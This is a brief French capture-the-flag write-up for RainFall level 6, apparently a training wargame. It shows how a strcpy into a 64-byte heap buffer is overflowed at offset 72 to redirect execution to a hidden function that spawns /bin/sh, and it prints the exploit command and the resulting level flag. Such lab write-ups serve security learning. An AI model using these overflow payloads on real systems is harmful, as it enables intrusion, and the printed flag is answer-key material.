# Level 6

On voit que le main contient un strcpy qui copy argv dans un buffer malloc a taille fix de 64 en tatonant on ce rend compte que le programme sgefault a 72.
```
level6@RainFall:~$ ./level6 kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
Segmentation fault (core dumped)
```
 Il est donc possible d'overflow le buffer pour y executer la fonction `n` pas appeler, qui execute un `'/bin/sh`, il suffit donc de placer l'adresse de `n` (`08048454`) a l'EBP pour executer cette dernier.
```
level6@RainFall:~$ ./level6 $(python -c "print 'a' * 72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ 
```